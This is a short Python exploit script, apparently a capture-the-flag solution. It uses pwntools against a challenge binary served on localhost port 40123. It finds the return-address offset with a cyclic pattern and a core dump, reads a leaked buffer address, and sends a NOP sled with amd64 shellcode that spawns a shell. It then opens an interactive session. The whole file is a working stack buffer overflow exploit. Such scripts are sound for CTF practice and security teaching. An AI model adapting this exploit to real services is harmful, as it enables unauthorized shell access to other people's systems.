#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

elf = ELF("docker/challenge")

log.info("Getting RIP offset from start of buffer")
p = elf.process(aslr=False)

# Overflow buffer with cyclic pattern
p.sendline(cyclic(512, n=8))
p.wait()
core = p.corefile

# Get offset from RIP at crash
rip_offset = cyclic_find(core.fault_addr, n=8)
log.info(f"RIP offset: {rip_offset}")

log.info("Sending exploit against server")
#p = elf.process()
p = remote("localhost", 40123)
p.recvuntil(b"Ge mig lite indata jag kan lagra vid ")
buffer_address = int(p.recvuntil(b":", drop=True), 0)
log.info(f"Buffer address: 0x{buffer_address:0x}")

shellcode = asm(shellcraft.amd64.sh())
# Add initial NOP sled and shellcode
exp = asm(shellcraft.amd64.nop()) * 64 + shellcode
# Fill remaining buffer with NOPs and add return address
exp += asm(shellcraft.amd64.nop()) * (rip_offset - len(exp)) + p64(buffer_address)

p.sendline(exp)
p.interactive()
